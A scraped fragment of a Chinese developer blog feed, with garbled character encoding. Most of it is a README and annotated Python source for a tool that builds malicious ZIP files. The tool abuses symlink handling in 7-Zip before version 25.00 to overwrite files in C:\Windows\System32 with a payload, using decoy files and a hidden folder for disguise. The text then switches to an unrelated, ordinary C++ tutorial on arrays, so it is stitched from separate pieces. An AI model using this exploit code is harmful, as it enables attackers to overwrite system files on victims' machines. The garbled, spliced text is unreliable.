<p>ä½¿ç”¨ <code>pip</code> å®‰è£…ä¾èµ–ï¼ˆå¦‚æœéœ€è¦ï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pip install toml
</code></pre>
<h3 data-id="heading-5">è·å–ä»£ç </h3>
<p>å‡è®¾æ‚¨å·²å°†é¡¹ç›®æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°ã€‚</p>
<h2 data-id="heading-6">ä½¿ç”¨è¯´æ˜</h2>
<h3 data-id="heading-7">1. é…ç½®</h3>
<p>åœ¨ä½¿ç”¨å‰ï¼Œå¿…é¡»ç¼–è¾‘é…ç½®æ–‡ä»¶ <code>resource/config.toml</code>ï¼š</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[path]</span>
<span class="hljs-comment"># ç”Ÿæˆçš„æ¶æ„ZIPæ–‡ä»¶çš„è¾“å‡ºè·¯å¾„</span>
<span class="hljs-attr">output</span> = <span class="hljs-string">'resource/output/result.zip'</span>
<span class="hljs-comment"># åŒ…å«å°†è¦è¢«æ‰“åŒ…åˆ°ZIPä¸­çš„æ­£å¸¸æ–‡ä»¶çš„æºç›®å½•</span>
<span class="hljs-attr">source</span> = <span class="hljs-string">'path/to/some/dir'</span>
<span class="hljs-comment"># ç›®æ ‡ç›®å½•ï¼ˆä½ å¸Œæœ›æ›¿æ¢å…¶ä¸­æ–‡ä»¶çš„ç›®å½•ï¼Œä¾‹å¦‚ç³»ç»Ÿç›®å½•ï¼‰</span>
<span class="hljs-attr">target</span> = <span class="hljs-string">'C:\Windows\System32'</span>
<span class="hljs-comment"># è½½è·æ–‡ä»¶ï¼ˆå°†ç”¨äºæ›¿æ¢ç›®æ ‡ç›®å½•ä¸­åŸæ–‡ä»¶çš„æ–‡ä»¶ï¼‰</span>
<span class="hljs-attr">payload</span> = <span class="hljs-string">'C:\Windows\System32\calc.exe'</span>
</code></pre>
<p><strong>å‚æ•°è¯´æ˜ï¼š</strong></p>
<ul>
<li><code>output</code>: å·¥å…·è¿è¡Œåç”Ÿæˆçš„ZIPæ–‡ä»¶è·¯å¾„ã€‚</li>
<li><code>source</code>: ä¸€ä¸ªåŒ…å«æ­£å¸¸æ–‡ä»¶çš„ç›®å½•ï¼Œè¿™äº›æ–‡ä»¶ä¼šè¢«æ‰“åŒ…åˆ°ZIPçš„æ ¹ç›®å½•ä¸‹ï¼Œç”¨äºä¼ªè£…ã€‚</li>
<li><code>target</code>: å¸Œæœ›è¿›è¡Œæ–‡ä»¶æ›¿æ¢çš„ç›®æ ‡Windowsç»å¯¹è·¯å¾„ï¼ˆä¾‹å¦‚ç³»ç»Ÿç›®å½•ï¼‰ã€‚</li>
<li><code>payload</code>: ç”¨äºæ›¿æ¢ç›®æ ‡æ–‡ä»¶çš„æ¶æ„è½½è·æ–‡ä»¶è·¯å¾„ã€‚</li>
</ul>
<h3 data-id="heading-8">2. è¿è¡Œåˆ©ç”¨ç¨‹åº</h3>
<p>åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash">uv run src/main.py
</code></pre>
<p>æˆ–ç›´æ¥è¿è¡ŒPythonè„šæœ¬ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">python src/main.py
</code></pre>
<h3 data-id="heading-9">3. è§¦å‘æ¼æ´</h3>
<p>å°†ç”Ÿæˆçš„ZIPæ–‡ä»¶ï¼ˆå¦‚<code>result.zip</code>ï¼‰åœ¨å­˜åœ¨æ¼æ´çš„7-Zipç‰ˆæœ¬ï¼ˆ&lt; 25.00ï¼‰çš„Windowsç³»ç»Ÿä¸Šè§£å‹ã€‚è§£å‹åï¼Œ<code>target</code>å‚æ•°æŒ‡å®šçš„ç›®å½•ä¸‹çš„æŸä¸ªæ–‡ä»¶ï¼ˆç”±<code>payload</code>çš„æ–‡ä»¶åå†³å®šï¼‰å°†è¢«æ›¿æ¢ä¸ºè½½è·æ–‡ä»¶ã€‚åŒæ—¶ï¼Œè§£å‹å‡ºçš„æ–‡ä»¶å¤¹ä¸­ä¼šåŒ…å«ä¸€ä¸ªéšè—çš„ <code>.zip</code> æ–‡ä»¶å¤¹ã€‚</p>
<blockquote>
<p><strong>è­¦å‘Šï¼š</strong> ç”Ÿæˆçš„ZIPæ–‡ä»¶å…·æœ‰ç ´åæ€§ã€‚è¯·åŠ¡å¿…åœ¨éš”ç¦»çš„è™šæ‹Ÿæœºæˆ–æµ‹è¯•ç¯å¢ƒä¸­è¿›è¡Œè§£å‹æµ‹è¯•ï¼Œåˆ‡å‹¿åœ¨ç”Ÿäº§ç¯å¢ƒæˆ–é‡è¦ä¸ªäººç”µè„‘ä¸Šæ“ä½œã€‚</p>
</blockquote>
<h2 data-id="heading-10">æ ¸å¿ƒä»£ç </h2>
<p>ä»¥ä¸‹æ‘˜å½•å¹¶æ³¨é‡Šäº†é¡¹ç›®ä¸­çš„æ ¸å¿ƒä»£ç æ–‡ä»¶ <code>src/main.py</code>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> toml
<span class="hljs-keyword">import</span> logging
<span class="hljs-keyword">import</span> zipfile

<span class="hljs-comment"># ... (ASCIIè‰ºæœ¯å­—å’Œæ—¥å¿—é…ç½®çœç•¥)</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">add_dir</span>(<span class="hljs-params">output, arcname, hidden=<span class="hljs-literal">False</span></span>):
    <span class="hljs-string">"""
    å‘ZIPæ–‡ä»¶å¯¹è±¡ä¸­æ·»åŠ ä¸€ä¸ªç›®å½•æ¡ç›®ã€‚
    
    å‚æ•°:
        output: zipfile.ZipFile å¯¹è±¡ã€‚
        arcname: ç›®å½•åœ¨ZIPä¸­çš„è·¯å¾„ã€‚
        hidden: å¸ƒå°”å€¼ï¼Œå¦‚æœä¸ºTrueï¼Œåˆ™è®¾ç½®ç›®å½•çš„DOSéšè—å±æ€§ã€‚
    """</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> arcname.endswith(<span class="hljs-string">'/'</span>):
        arcname += <span class="hljs-string">'/'</span>
    conf = zipfile.ZipInfo(arcname)
    conf.date_time = time.localtime(time.time())[:<span class="hljs-number">6</span>]
    DOS_DIR = <span class="hljs-number">0x10</span>
    <span class="hljs-keyword">if</span> hidden:
        DOS_HIDDEN = <span class="hljs-number">0x02</span>
        dos_attrs = DOS_DIR | DOS_HIDDEN
    <span class="hljs-keyword">else</span>:
        dos_attrs =  DOS_DIR 
    
    conf.external_attr = dos_attrs <span class="hljs-comment"># è®¾ç½®å¤–éƒ¨æ–‡ä»¶å±æ€§ï¼ˆæ­¤å¤„ç”¨äºæ¨¡æ‹ŸDOSç›®å½•å’Œéšè—å±æ€§ï¼‰</span>
    conf.compress_type = zipfile.ZIP_STORED <span class="hljs-comment"># ä½¿ç”¨å­˜å‚¨æ¨¡å¼ï¼ˆä¸å‹ç¼©ï¼‰</span>
    output.writestr(conf, <span class="hljs-string">b''</span>) <span class="hljs-comment"># å†™å…¥ç©ºå†…å®¹ä»¥åˆ›å»ºç›®å½•æ¡ç›®</span>
    logging.info(<span class="hljs-string">f"Added dir <span class="hljs-subst">{arcname}</span>"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">add_file</span>(<span class="hljs-params">output, arcname, src_path</span>):
    <span class="hljs-string">"""
    å°†æœ¬åœ°æ–‡ä»¶æ·»åŠ åˆ°ZIPæ–‡ä»¶å¯¹è±¡ä¸­ã€‚
    
    å‚æ•°:
        output: zipfile.ZipFile å¯¹è±¡ã€‚
        arcname: æ–‡ä»¶åœ¨ZIPä¸­çš„è·¯å¾„ã€‚
        src_path: æœ¬åœ°æºæ–‡ä»¶çš„è·¯å¾„ã€‚
    """</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(src_path, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:
        payload = f.read()
    conf = zipfile.ZipInfo(arcname)
    conf.date_time = time.localtime(time.time())[:<span class="hljs-number">6</span>]
    conf.create_system = <span class="hljs-number">3</span> <span class="hljs-comment"># è®¾ç½®ä¸ºUNIXç³»ç»Ÿï¼Œä»¥å…¼å®¹å¤–éƒ¨å±æ€§è®¾ç½®</span>
    conf.external_attr = (<span class="hljs-number">0o100644</span> &lt;&lt; <span class="hljs-number">16</span>) <span class="hljs-comment"># è®¾ç½®ç±»UNIXæ–‡ä»¶æƒé™ (rw-r--r--)</span>
    conf.compress_type = zipfile.ZIP_STORED
    output.writestr(conf, payload)
    logging.info(<span class="hljs-string">f"Added file <span class="hljs-subst">{arcname}</span>"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-comment"># ... (æ‰“å°æ¨ªå¹…å’Œå¯åŠ¨æ—¥å¿—çœç•¥)</span>

    <span class="hljs-comment"># 1. åŠ è½½é…ç½®æ–‡ä»¶</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"./resource/config.toml"</span>, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> file:
        config = toml.load(file)

    zip_out = config[<span class="hljs-string">"path"</span>][<span class="hljs-string">"output"</span>]
    source = config[<span class="hljs-string">"path"</span>][<span class="hljs-string">"source"</span>]
    target = config[<span class="hljs-string">"path"</span>][<span class="hljs-string">"target"</span>] <span class="hljs-comment"># ç›®æ ‡ç›®å½•ï¼Œä¾‹å¦‚ C:\Windows\System32</span>
    payload = config[<span class="hljs-string">"path"</span>][<span class="hljs-string">"payload"</span>] <span class="hljs-comment"># è½½è·æ–‡ä»¶</span>

    top_dir = os.path.basename(os.path.normpath(source))
    
    <span class="hljs-comment"># 2. æ„é€ æ¶æ„è·¯å¾„ç»“æ„</span>
    hidden_zip_dir = <span class="hljs-string">f"<span class="hljs-subst">{top_dir}</span>/.zip"</span> <span class="hljs-comment"># éšè—çš„.zipç›®å½•</span>
    link = <span class="hljs-string">f"<span class="hljs-subst">{hidden_zip_dir}</span>/link"</span>    <span class="hljs-comment"># ç¬¦å·é“¾æ¥æ–‡ä»¶çš„è·¯å¾„</span>
    payload_name = os.path.basename(payload)
    file_entry = <span class="hljs-string">f"<span class="hljs-subst">{link}</span>/<span class="hljs-subst">{payload_name}</span>"</span> <span class="hljs-comment"># è½½è·æ–‡ä»¶åœ¨ZIPä¸­çš„è·¯å¾„ï¼ˆå°†å†™å…¥ç¬¦å·é“¾æ¥æŒ‡å‘çš„ä½ç½®ï¼‰</span>

    output = zipfile.ZipFile(zip_out, <span class="hljs-string">"w"</span>)

    <span class="hljs-comment"># 3. æ·»åŠ æ­£å¸¸çš„ç›®å½•å’Œæ–‡ä»¶ç»“æ„ï¼ˆç”¨äºä¼ªè£…ï¼‰</span>
    source_dir_path = os.path.normpath(source)
    add_dir(output, top_dir)
    add_dir(output, hidden_zip_dir, hidden=<span class="hljs-literal">True</span>) <span class="hljs-comment"># æ·»åŠ éšè—çš„.zipç›®å½•</span>

    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(source_dir_path):
        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:
            file_path = os.path.join(root, file)
            rel_path = os.path.relpath(file_path, source_dir_path)
            arcname = <span class="hljs-string">f"<span class="hljs-subst">{top_dir}</span>/<span class="hljs-subst">{rel_path}</span>"</span>
            add_file(output, arcname, file_path)
        
        <span class="hljs-keyword">for</span> dir_name <span class="hljs-keyword">in</span> dirs:
            dir_path = os.path.join(root, dir_name)
            rel_path = os.path.relpath(dir_path, source_dir_path)
            arcname = <span class="hljs-string">f"<span class="hljs-subst">{top_dir}</span>/<span class="hljs-subst">{rel_path}</span>/"</span>
            add_dir(output, arcname)
    
    <span class="hljs-comment"># 4. åˆ›å»ºæ¶æ„çš„ç¬¦å·é“¾æ¥æ¡ç›®ï¼ˆæ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒï¼‰</span>
    conf = zipfile.ZipInfo(link)
    conf.date_time = time.localtime(time.time())[:<span class="hljs-number">6</span>]
    conf.create_system = <span class="hljs-number">3</span> <span class="hljs-comment"># UNIXç³»ç»Ÿ</span>
    <span class="hljs-comment"># è®¾ç½®å¤–éƒ¨å±æ€§ä¸ºç¬¦å·é“¾æ¥ (0o120777 -&gt; lrwxrwxrwx)</span>
    <span class="hljs-comment"># è¿™æ˜¯å…³é”®ï¼Œå®ƒå‘Šè¯‰è§£å‹è½¯ä»¶è¿™æ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥æ–‡ä»¶</span>
    conf.external_attr = (<span class="hljs-number">0o120777</span> &lt;&lt; <span class="hljs-number">16</span>)
    conf.compress_type = zipfile.ZIP_STORED
    <span class="hljs-comment"># å°†ç¬¦å·é“¾æ¥çš„ç›®æ ‡è·¯å¾„ï¼ˆtargetï¼‰ä½œä¸ºè¯¥ZIPæ¡ç›®çš„å†…å®¹å†™å…¥</span>
    <span class="hljs-comment"># å­˜åœ¨æ¼æ´çš„7-Zipä¼šé”™è¯¯åœ°å°†æ­¤ç›¸å¯¹è·¯å¾„ä¸è§£å‹ç›®å½•æ‹¼æ¥ï¼Œå¯¼è‡´è·¯å¾„éå†</span>
    output.writestr(conf, target.encode(<span class="hljs-string">'utf-8'</span>))
    logging.info(<span class="hljs-string">"Symlink added"</span>)

    <span class="hljs-comment"># 5. æ·»åŠ è½½è·æ–‡ä»¶ã€‚å…¶è·¯å¾„(file_entry)æŒ‡å‘äº†ç¬¦å·é“¾æ¥å†…éƒ¨ã€‚</span>
    <span class="hljs-comment"># å½“è§£å‹æ—¶ï¼Œ7-Zipä¼šå°è¯•å°†æ­¤æ–‡ä»¶å†™å…¥åˆ°ç¬¦å·é“¾æ¥æŒ‡å‘çš„ç›®æ ‡ä½ç½®ã€‚</span>
    add_file(output, file_entry, payload)

    logging.info(<span class="hljs-string">f"Bon AppÃ©tit!"</span>)
    output.close()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>
<p><strong>ä»£ç æµç¨‹æ€»ç»“ï¼š</strong></p>
<ol>
<li><strong>åŠ è½½é…ç½®</strong>ï¼šè¯»å–ç›®æ ‡è·¯å¾„ã€æºç›®å½•å’Œè½½è·æ–‡ä»¶ã€‚</li>
<li><strong>æ„å»ºZIPç»“æ„</strong>ï¼šåˆ›å»ºåŒ…å«æ­£å¸¸æ–‡ä»¶çš„ç›®å½•æ ‘å’Œä¸€ä¸ªéšè—çš„<code>.zip</code>æ–‡ä»¶å¤¹ã€‚</li>
<li><strong>æ¤å…¥ç¬¦å·é“¾æ¥</strong>ï¼šåœ¨éšè—æ–‡ä»¶å¤¹å†…åˆ›å»ºä¸€ä¸ªç¬¦å·é“¾æ¥æ–‡ä»¶ï¼Œå…¶å†…å®¹ï¼ˆé“¾æ¥ç›®æ ‡ï¼‰æŒ‡å‘é…ç½®çš„<code>target</code>è·¯å¾„ï¼ˆå¦‚<code>C:\Windows\System32</code>ï¼‰ã€‚</li>
<li><strong>åµŒå…¥è½½è·</strong>ï¼šå°†ä¸€ä¸ªæ–‡ä»¶ï¼ˆè½½è·ï¼‰æ·»åŠ åˆ°ZIPä¸­ï¼Œä½†å…¶è·¯å¾„è¢«è®¾ç½®ä¸ºä½äºç¬¦å·é“¾æ¥â€œå†…éƒ¨â€ï¼ˆä¾‹å¦‚<code>{éšè—æ–‡ä»¶å¤¹}/link/calc.exe</code>ï¼‰ã€‚</li>
<li><strong>æ¼æ´è§¦å‘</strong>ï¼šå½“å­˜åœ¨æ¼æ´çš„7-Zipè§£å‹æ­¤ZIPæ—¶ï¼Œä¼šé”™è¯¯è§£æç¬¦å·é“¾æ¥ï¼Œå°†è½½è·æ–‡ä»¶å†™å…¥åˆ°<code>target</code>æŒ‡å®šçš„ç³»ç»Ÿç›®å½•ä¸­ï¼Œè¦†ç›–åŸæœ‰æ–‡ä»¶ã€‚
6HFtX5dABrKlqXeO5PUv/zYh9Asx8aX0tywYbTHNzf8=</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[C++ æ•°æ®ç»“æ„ | æ•°ç»„çš„åº•å±‚åŸç†]]></title>    <link>https://juejin.cn/post/7588704463620145171</link>    <guid>https://juejin.cn/post/7588704463620145171</guid>    <pubDate>2025-12-29T05:17:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588704463620145171" data-draft-id="7588411503122350116" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="C++ æ•°æ®ç»“æ„ | æ•°ç»„çš„åº•å±‚åŸç†"/> <meta itemprop="keywords" content="C++"/> <meta itemprop="datePublished" content="2025-12-29T05:17:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å›¾å½¢å­¦çˆ±å¥½è€…_Wu"/> <meta itemprop="url" content="https://juejin.cn/user/1060359067408631"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            C++ æ•°æ®ç»“æ„ | æ•°ç»„çš„åº•å±‚åŸç†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1060359067408631/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å›¾å½¢å­¦çˆ±å¥½è€…_Wu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T05:17:28.000Z" title="Mon Dec 29 2025 05:17:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä»Šå¤©æˆ‘ä»¬æ¥è®²ä¸€ä¸‹C++çš„æ•°æ®ç»“æ„,C++çš„æ•°æ®ç»“æ„ç±»å‹å¤šæ ·,ä¸»è¦æœ‰æ•°ç»„ã€å­—ç¬¦ä¸²ã€æ ˆã€é˜Ÿåˆ—ã€å †ã€æ ‘ã€å›¾ã€å“ˆå¸Œè¡¨ã€é›†åˆã€æ˜ å°„ç­‰ç­‰,ä»Šå¤©æˆ‘ä»¬ä¸»è¦è®²çš„æ˜¯C++æ•°æ®ç»“æ„æœ€åŸºç¡€çš„æ•°ç»„åŠå…¶åº•å±‚åŸç†</p>
<h2 data-id="heading-0">æ•°ç»„</h2>
<p>æ•°ç»„æ˜¯C++ç¼–ç¨‹ä¸­æœ€åŸºç¡€ä¹Ÿæœ€å¸¸ç”¨çš„æ•°æ®ç»“æ„ä¹‹ä¸€,å®ƒæ˜¯<strong>åœ¨è¿ç»­çš„å­˜å‚¨ç©ºé—´ä¸­å­˜å‚¨åŒç±»å‹æ•°æ®çš„æ•°æ®ç»“æ„</strong>,æ¯”å¦‚,åœ¨ä¸€å—è¿ç»­å†…å­˜å…¨éƒ¨å­˜å‚¨intç±»å‹çš„æ•°æ®,æˆ–è€…å…¨éƒ¨doubleç±»å‹çš„æ•°æ®
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c1872ef92d144ec3a11cd2e1bd81af60~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu-5b2i5a2m54ix5aW96ICFX1d1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767590248&amp;x-signature=sBnO9dZhq3aa1%2B9NZF4rgC1nx1c%3D" alt="" loading="lazy"/>
åœ¨ C++ ä¸­ï¼Œæ•°ç»„åˆ†ä¸º<code>é™æ€æ•°ç»„</code>å’Œ<code>åŠ¨æ€æ•°ç»„</code></p>
<h2 data-id="heading-1">é™æ€æ•°ç»„</h2>
<p>é™æ€æ•°ç»„æ˜¯<strong>å­˜å‚¨ç©ºé—´è¿ç»­</strong>çš„å¹¶ä¸”<strong>å­˜å‚¨å¤§å°å›ºå®š</strong>çš„æ•°ç»„,æ˜¯æ•°ç»„æœ€åŸºç¡€çš„å½¢å¼</p>
<h3 data-id="heading-2">åº•å±‚å­˜å‚¨åŸç†</h3>
<p>é™æ€æ•°ç»„å­˜å‚¨ç©ºé—´çš„å¤§å°åœ¨ç¼–è¯‘é˜¶æ®µå°±å·²ç¡®å®š,è¿è¡Œæ—¶æ— æ³•ä¿®æ”¹,æ¯”å¦‚åœ¨å†™ä»£ç çš„æ—¶å€™å£°æ˜<code>int arr[5];</code>,ç¼–è¯‘æ—¶å…¶æ€»å¤§å°å›ºå®šä¸º 20 å­—èŠ‚(inté€šå¸¸å  4 å­—èŠ‚)</p>
<p>å½“ä½ å£°æ˜ä¸€ä¸ªé™æ€æ•°ç»„æ—¶,ç¼–è¯‘å™¨è®¡ç®—æ•°ç»„æ‰€éœ€çš„å†…å­˜ç©ºé—´å,å‘å†…å­˜ç®¡ç†å™¨ç”³è¯·ä¸€æ®µè¿ç»­çš„å­—èŠ‚ç©ºé—´,å…¶ä¸­è¿™æ®µç©ºé—´çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åœ°å€,å°±æ˜¯æ•°ç»„çš„é¦–åœ°å€,ç¼–è¯‘å™¨ä¼šæŠŠæ•°ç»„åå’Œé¦–åœ°å€ç»‘å®š,æ¯”å¦‚ä½ å£°æ˜<code>int arr[5];</code>,ç¼–è¯‘å™¨ä¼šå°†arrä½œä¸ºè¿™æ®µç©ºé—´çš„é¦–åœ°å€ï¼ˆå¸¸é‡æŒ‡é’ˆï¼‰ä¿å­˜èµ·æ¥,ä½ ä½¿ç”¨arræ—¶,æœ¬è´¨å°±æ˜¯åœ¨ä½¿ç”¨è¿™ä¸ªé¦–åœ°å€</p>
<h3 data-id="heading-3">é™æ€æ•°ç»„çš„ä¸‹æ ‡è®¿é—®</h3>
<p>æ•°ç»„çš„ä¸‹æ ‡è®¿é—®<code>arr[i]</code>æœ¬è´¨æ˜¯åœ°å€åç§»è®¡ç®—,å› ä¸ºå†…å­˜æ˜¯è¿ç»­çš„,é€šè¿‡é¦–åœ°å€ + åç§»é‡å¯ä»¥ç›´æ¥å®šä½åˆ°ç›®æ ‡å…ƒç´ ,æ‰€ä»¥å®ƒçš„æ—¶é—´å¤æ‚åº¦ä¸º O (1) ,è®¿é—®é€Ÿåº¦å¾ˆå¿«
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f19b708f4dec44f99ec4f7db0dc2c252~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zu-5b2i5a2m54ix5aW96ICFX1d1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767590248&amp;x-signature=RgGaopTXjc8at9vSMQISR7OUmZU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">é™æ€æ•°ç»„çš„å±€é™æ€§</h3>
<p>é™æ€æ•°ç»„è™½ç„¶å­˜å‚¨ç®€å•å¹¶ä¸”è®¿é—®é€Ÿåº¦å¿«,ä½†åŒæ—¶ä¹Ÿå­˜åœ¨ä¸¤ä¸ªè‡´å‘½çš„ç¼ºé™·,å°±æ˜¯<code>å¤§å°å›ºå®š</code>å’Œ<code>å†…å­˜ä½ç½®å›ºå®š</code></p>
<p><strong>å¤§å°å›ºå®š</strong>ä½¿å¾—å£°æ˜æ—¶å¿…é¡»æŒ‡å®šç¡®å®šçš„å¤§å°,è‹¥å®é™…æ•°æ®é‡è¶…è¿‡æ•°ç»„å¤§å°ä¼šå¯¼è‡´è¶Šç•Œ,ä¸è¶³åˆ™æµªè´¹å†…å­˜</p>
